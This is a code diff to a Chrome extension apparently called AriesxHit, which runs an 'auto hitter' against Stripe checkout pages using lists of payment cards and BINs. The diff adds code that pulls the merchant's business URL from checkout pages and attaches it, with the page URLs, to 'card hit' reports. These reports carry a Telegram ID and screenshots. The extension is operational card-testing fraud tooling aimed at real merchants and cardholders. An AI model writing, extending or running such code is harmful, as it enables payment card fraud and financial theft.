@@ -19,6 +19,8 @@ const state = {
   usedCardsInSession: new Set(),
   // Track current mode
   currentMode: 'cc_list', // 'bin_mode' or 'cc_list'
+  // Store last business_url for merchant extraction
+  lastBusinessUrl: null,
 };
 
 // Parse single proxy line. Supports: host:port | host:port:user:pass | user:pass@host:port
@@ -164,6 +166,34 @@ function injectAutoHitter(tabId, forceStateUpdate) {
   if (forceStateUpdate && tabId) {
     chrome.tabs.sendMessage(tabId, { type: 'STATE_UPDATE', autoHitActive: state.autoHitActive, cardList: state.cardList, binList: state.binList }).catch(() => {});
   }
+  // First extract business_url from checkout page if applicable
+  chrome.tabs.get(tabId, (tab) => {
+    if (tab?.url && tab.url.includes('checkout.stripe.com')) {
+      chrome.scripting.executeScript({
+        target: { tabId },
+        func: () => {
+          // Extract business_url from Stripe checkout page
+          try {
+            // Look for business_url in URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const businessUrl = urlParams.get('business_url');
+
+            if (businessUrl) {
+              // Send business_url back to background script
+              window.postMessage({
+                type: 'aries-business-url',
+                business_url: businessUrl,
+                url: window.location.href
+              }, '*');
+            }
+          } catch (e) {
+            console.log('[AriesxHit] Could not extract business_url:', e.message);
+          }
+        }
+      }).catch(() => {});
+    }
+  });
+
   chrome.scripting.executeScript({
     target: { tabId, allFrames: true },
     func: (url) => {
@@ -364,6 +394,14 @@ function captureCheckoutScreenshot(tab, cardStr) {
   });
 }
 
+// Listen for business_url messages from content scripts
+chrome.runtime.onMessage.addListener((msg, sender) => {
+  if (msg.type === 'aries-business-url' && msg.business_url) {
+    state.lastBusinessUrl = msg.business_url;
+    console.log('[AriesxHit] Stored business_url:', msg.business_url);
+  }
+});
+
 chrome.runtime.onMessage.addListener((msg, sender, respond) => {
 
   switch (msg.type) {
@@ -453,6 +491,31 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
         const tab = sender?.tab;
         const attemptStart = state._attemptStartTime || now;
         const durationSec = Math.round((now - attemptStart) / 1000);
+        // Try to extract business_url from current tab if not provided
+        let businessUrl = msg.business_url || '';
+
+        if (!businessUrl) {
+          // Get current tab URL to extract business_url
+          try {
+            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+              if (tabs[0] && tabs[0].url) {
+                const tabUrl = tabs[0].url;
+                if (tabUrl.includes('checkout.stripe.com')) {
+                  // Extract business_url from Stripe checkout URL
+                  const urlObj = new URL(tabUrl);
+                  // Try to get business_url from URL parameters or hash
+                  const businessParam = urlObj.searchParams.get('business_url');
+                  if (businessParam) {
+                    businessUrl = businessParam;
+                  }
+                }
+              }
+            });
+          } catch (e) {
+            console.log('[CARD_HIT] Could not extract business_url from tab:', e.message);
+          }
+        }
+
         const payload = {
           tg_id: r.ax_tg_id,
           name: r.ax_tg_name || 'User',
@@ -462,6 +525,9 @@ chrome.runtime.onMessage.addListener((msg, sender, respond) => {
           email: r.ax_fill_email || '',
           time_sec: durationSec,
           hit_mode: state.currentMode, // 'bin_mode' or 'cc_list'
+          current_url: msg.current_url || '',
+          merchant_url: msg.merchant_url || '',
+          business_url: businessUrl || state.lastBusinessUrl || ''
         };
         const doNotify = (screenshotB64) => {
           if (screenshotB64) payload.screenshot = screenshotB64;
